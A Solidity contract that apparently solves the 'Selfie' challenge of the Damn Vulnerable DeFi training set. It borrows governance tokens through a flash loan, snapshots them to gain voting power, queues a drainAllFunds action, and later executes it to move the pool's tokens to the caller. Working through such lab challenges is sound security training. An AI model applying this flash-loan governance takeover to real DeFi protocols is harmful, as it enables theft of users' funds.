// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */


contract FlashLoanReceive {
    SimpleGovernance private immutable governance;
    SelfiePool private immutable pool;
    DamnValuableTokenSnapshot public governanceToken;

    uint256 public actionId;

    event executeCall(address pool, uint256 value);


    constructor(address poolAddress, address governanceAddress, address governanceTokenAddress) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function receiveTokens(address someAddress, uint256 amount) public {
        governanceToken.snapshot();
        actionId = governance.queueAction(address(pool), bytes(abi.encodeWithSignature("drainAllFunds(address)", address(this))), 0);
        governanceToken.transfer(address(pool), amount);
    }

    function drainFunds() public {
        governance.executeAction(actionId);
        governanceToken.transfer(msg.sender, governanceToken.balanceOf(address(this)));
    }
    
    

}